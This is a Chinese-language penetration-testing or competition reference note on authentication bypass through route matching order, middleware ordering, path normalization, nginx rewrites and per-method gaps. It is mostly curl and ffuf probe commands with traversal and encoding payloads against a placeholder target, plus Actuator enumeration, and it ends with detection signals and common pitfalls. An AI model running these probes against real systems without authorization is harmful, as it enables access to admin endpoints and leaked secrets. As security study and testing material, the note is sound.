# 运行时路由：匹配优先级、中间件顺序与"声明有但没鉴权"的路由

> 被 `competition-runtime-routing` 引用。目标不是"发现更多路径"，而是**找出声明了鉴权
> 但实际执行路径没经过鉴权中间件的路由**。

## 一、先确定路由的匹配顺序（这是所有绕过的根基）

大多数框架的顺序是**按注册顺序 + 特异性**，不是按字符串长度：

| 框架 | 匹配规则 | 典型绕过 |
| --- | --- | --- |
| Express | 注册顺序，先匹配先用 | 先注册 `/user/:id` 再注册 `/user/me` → `/user/me` 命中 `:id` |
| Express（路由数组） | 同 `app.use` 上按数组顺序 | `/admin` 的鉴权挂在 `/admin` 之后的中间件 → 不生效 |
| FastAPI/Starlette | 注册顺序 | `/items/{id}` 先于 `/items/search` → search 被当 id |
| Flask | Werkzeug 规则排序（复杂度） | 静态规则优先 |
| gin（Go） | 按 HTTP 方法树 + 注册顺序 | 通配 `/*path` 会吃掉未注册路径 |
| Spring MVC | `PathPattern`/Ant 匹配，最长优先 | 精确 > `{var}` > `**` |
| Rails | 声明顺序 | `resources` 生成的路由顺序固定 |
| ASP.NET Core | 模板特异性，literal > param > catch-all | — |
| nginx | `=` > `^~` > 正则（按序）> 前缀（最长） | `location /admin` 与 `location /admin/` 差异 |
| Apache | `Alias` > `ScriptAlias` > `DocumentRoot` | `.htaccess` 的 `RewriteRule` 顺序 |

```bash
# Express/koa 类：从源码看注册顺序（bundled 服务端）
grep -nE "app\.(get|post|put|use|all)\(" server.js | head -40

# Express 的中间件顺序（鉴权挂在哪）
grep -nE "app\.use\(" server.js
```

```bash
# Flask/FastAPI：从 OpenAPI 看路径表（顺序在 json 里按注册）
curl -s https://target/openapi.json | jq -r '.paths | keys[]'

# Django：URL conf
python3 manage.py show_urls 2>/dev/null || true
```

```bash
# Spring：actuator 的 mappings（若暴露）
curl -s https://target/actuator/mappings | jq '.contexts[].mappings.dispatcherServlets.dispatcherServlet[] | {pattern: .predicate, method: .details.requestMappingConditions.methods}'
```

```bash
# nginx 配置（若能读）
nginx -T 2>/dev/null | grep -nE 'location|proxy_pass|auth_request|deny|allow'
```

## 二、五种"声明有但实际没鉴权"

### 2.1 路由先注册，鉴权后注册

```javascript
// 错误顺序（Express）
app.get('/api/users', listUsers);        // ← 无鉴权就可达
app.use('/api', authMiddleware);          // ← 太晚，只对之后的生效
app.get('/api/orders', listOrders);       // ← 有鉴权
```

```bash
# 测试方法：枚举所有 /api/* 路由，看哪些 200 哪些 401
for p in users orders admin/audit public/status internal/metrics; do
  printf '%-20s ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' "https://target/api/$p"
done
# 混合出现 200/401 → 说明中间件挂载有缺口
```

### 2.2 路径匹配差异导致绕过

```bash
# 大小写（某些框架路由大小写不敏感，但鉴权中间件路径大小写敏感）
curl -s -o /dev/null -w '%{http_code}\n' https://target/Admin/users
curl -s -o /dev/null -w '%{http_code}\n' https://target/ADMIN/users

# 尾斜杠
curl -s -o /dev/null -w '%{http_code}\n' https://target/admin/users/
curl -s -o /dev/null -w '%{http_code}\n' https://target/admin/users//

# 编码
curl -s -o /dev/null -w '%{http_code}\n' https://target/admin%2fusers
curl -s -o /dev/null -w '%{http_code}\n' https://target/%61dmin/users      # %61 = 'a'
curl -s -o /dev/null -w '%{http_code}\n' https://target/admin/./users
curl -s -o /dev/null -w '%{http_code}\n' https://target/admin/users/..%2fadmin/users

# 分号（Spring 的 matrix variable）
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/admin;x=1/users'
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/admin/users;jsessionid=x'

# 扩展名
curl -s -o /dev/null -w '%{http_code}\n' https://target/admin/users.json
curl -s -o /dev/null -w '%{http_code}\n' https://target/admin/users/
```

**判据**：某个变体返回 200 而原始路径返回 401/403 → **鉴权基于字符串前缀匹配，路由基于规范化后匹配**。

```bash
# 批量跑（用 ffuf 对路径做变体变换）
ffuf -u 'https://target/FUZZ' -w admin_paths.txt -mc all -fc 404 -H 'Authorization: Bearer '$LOW_TOKEN
```

### 2.3 rewrite 后鉴权丢失

```nginx
# nginx：内部 rewrite 到未受保护的 location
location /admin/ {
    auth_request /auth;          # 有鉴权
}
location /internal/ {
    # 无鉴权
}
location /admin/legacy/ {
    rewrite ^/admin/legacy/(.*)$ /internal/$1 last;   # 跳过后鉴权
}
```

```bash
# 找出 rewrite 目标
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' https://target/admin/legacy/users
# 若 200 且内容与 /internal/users 一致 → rewrite 绕过了鉴权
```

### 2.4 路由守卫只看前端

| 现象 | 判断 |
| --- | --- |
| SPA 的 `/admin` 页面能打开（前端路由） | 只说明前端放行，要测 `/api/admin/*` |
| 直接访问 `/api/admin/users` 返回 401 | 后端有鉴权 |
| 直接访问返回 200 且是 HTML | 后端把未知路径回退到 index.html（不是放行） |

```bash
# 区分"回退到 SPA"和"真的无鉴权"
curl -s https://target/api/admin/users -H 'Accept: application/json' | head -c 200
# JSON → 真的调到了 handler
# <!DOCTYPE html> → SPA fallback
```

### 2.5 方法级鉴权缺失

```bash
# 对不同 HTTP 方法逐个测
for m in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  printf '%-8s ' "$m"
  curl -s -o /dev/null -w '%{http_code}\n' -X $m "https://target/api/admin/users" \
    -H "Authorization: Bearer $LOW_TOKEN" -H 'Content-Type: application/json' -d '{}'
done
```

**常见**：`GET` 挂了 `@PreAuthorize`，`PATCH` 忘了；或者 `@PreAuthorize` 在 service 层，
controller 的某个方法没走 service。

## 三、路径穿越与规范化

```bash
# 编码层数不同的穿越
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/static/../admin/users'
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/static/%2e%2e/admin/users'
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/static/%2e%2e%2fadmin/users'
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/static/..%252fadmin/users'   # 双编码
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/static/....//admin/users'
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/static/..;/admin/users'      # Tomcat
```

**关键**：不同层做不同次数的解码。前端解一次、后端解一次 → 双编码能穿过前端规则。

```bash
# 判断有几层解码：用 %252e 试，若成功说明后端解了两次
# 或用回显：让路径出现在错误信息里，看它被解成了什么
curl -s 'https://target/api/%3Cscript%3E' | grep -o '<script>' | head -1
```

## 四、路由发现：谁有路径列表

| 来源 | 命令 | 价值 |
| --- | --- | --- |
| OpenAPI/Swagger | `curl /openapi.json`、`/swagger.json`、`/v3/api-docs` | 高（含参数） |
| Spring Actuator | `/actuator/mappings` | **极高**（全量路由 + 方法） |
| Next.js 构建产物 | `/_next/static/*/_buildManifest.js` | 高（页面路由） |
| JS bundle | `grep -oE '"/api/[a-z0-9/_-]+"'` | 高（真实调用） |
| sitemap/robots | `/sitemap.xml`、`/robots.txt` | 中 |
| 404 差异 | 对比已知存在/不存在的路径响应长度 | 中（判断 SPA fallback） |
| 目录爆破 | `ffuf`/`feroxbuster` | 中（大量噪声） |

```bash
# Actuator 优先（一步到位）
for e in mappings env health beans configprops; do
  printf '%-12s ' "$e"
  curl -s -o /dev/null -w '%{http_code}\n' "https://target/actuator/$e"
done

# 拿到 mappings 后，提取所有 pattern
curl -s https://target/actuator/mappings | jq -r '.. | .predicate? // empty' | sort -u
```

```bash
# 从 bundle 里提 API 路径
curl -s https://target/static/js/main.js -o main.js
grep -oE '"/(api|v[0-9])/[a-zA-Z0-9_/{}\-]+"' main.js | tr -d '"' | sort -u | head -50
grep -oE '`/api/[^`]+`' main.js | tr -d '`' | sort -u | head -30
```

## 五、中间件执行顺序：怎么看出鉴权在哪一层

```bash
# 用"错误响应"的差异判断谁先执行
# ① 无 token 访问受保护路由
curl -s -i https://target/api/admin/users | head -8
#   401 + JSON {"error":"unauthorized"}  → 鉴权中间件先跑
#   400 + JSON {"error":"missing param"} → 参数校验先跑（鉴权在后面，可能被绕过）

# ② 带非法 JSON body 访问
curl -s -i -X POST https://target/api/admin/users -H 'Content-Type: application/json' -d '{bad'
#   400 (JSON parse error) → body 解析在鉴权之前，可做 XXE/反序列化
#   401 → 鉴权在前，安全
```

**这个技巧非常有效**：错误信息的先后顺序就是中间件顺序。

```bash
# ③ 用超大 body 看是否在鉴权前被读（DoS/内存）
# ④ 用特殊 Content-Type 看是否有分支
curl -s -o /dev/null -w '%{http_code}\n' -X POST https://target/api/admin/users \
  -H 'Content-Type: application/xml' -d '<x/>'
```

## 六、验伤：路由绕过的成功标准

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| 路径变体绕过 | 变体返回**业务数据**（JSON 含真实字段） | 200 但 body 是 SPA index.html |
| 方法绕过 | `PATCH` 真的改了数据（回读确认） | 200 但 body `{"ok":true}` 未落库 |
| 中间件顺序漏洞 | 未认证请求触发了**业务副作用**（写了一条记录） | 只看到 400 参数错误 |
| rewrite 绕过 | 通过 `/admin/legacy/x` 拿到了 `/internal/x` 的数据 | 只是 302 到登录页 |
| 大小写绕过 | `/ADMIN/users` 返回管理数据 | 200 但是通用错误页 |
| 未注册路由可达 | 访问一个**没有在路由表**的路径拿到数据 | 400（框架拒绝） |

**必须排除 SPA fallback**：返回 200 + HTML 几乎都是前端通配路由，不是漏洞。

```bash
# 快速判定是不是 fallback
curl -s https://target/api/does-not-exist-12345 | head -c 60
# 与 curl -s https://target/api/admin/users | head -c 60 对比
# 若两者前缀相同（都是 <!DOCTYPE html>）→ 都是 fallback
```

## 七、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| 路径变体探测 | WAF/网关 | 同一资源的高频变体（大小写/编码/尾斜杠）来自同一 IP |
| 路由枚举 | 访问日志 | 大量 404 集中在 `/admin`、`/internal`、`/actuator` |
| Actuator 探测 | 应用日志 | `/actuator/*` 请求；`env` 含敏感变量 |
| 方法绕过 | 应用审计 | `PATCH`/`DELETE` 在管理端点上由低权主体发起 |
| 未授权访问 | 授权日志 | `path` 与 `role` 不匹配；`role` 缺失但返回 2xx |
| 规范化差异 | 网关 | URL 含 `%2e`、`%2f`、`;`、`//` |
| 中间件顺序 | 应用错误日志 | 未认证请求触发了 body 解析/DB 查询 |

**关键埋点**：记录 `原始 path` 与 `规范化后 path` 两列。只记规范化后的，路径变体绕过完全
不可见。

## 八、常见坑

1. **只爆破路径不看方法**——很多路由只在特定方法上没鉴权。`OPTIONS` 先看 `Allow` 头。
2. **把 SPA fallback 当漏洞**——200 + HTML 基本都是前端路由。看 `Content-Type`。
3. **忘了尾斜杠**——Express 默认 `/a` 和 `/a/` 不同；Spring 默认合并；Flask 会 308 重定向。
4. **`%2f` 被代理吃掉**——nginx 默认会先解码再匹配，`%2f` 变成 `/` 导致路径变了。要测多层编码。
5. **大小写只在 Windows 上不敏感**——Linux 上的路由通常大小写敏感，但某些框架的中间件路径匹配不敏感。两头都要试。
6. **Actuator 只测 `/actuator`**——`/actuator/mappings`、`/actuator/env`、`/actuator/heapdump` 才是金矿，且常被单独暴露。
7. **误判"401 = 有鉴权"**——401 可能是网关加的，后端仍会执行（尤其当网关只做头检查）。要看 401 是否带业务副作用。
8. **rewrite 测试只看状态码**——要看**内容**是否与目标路由一致，302/200 都可能骗人。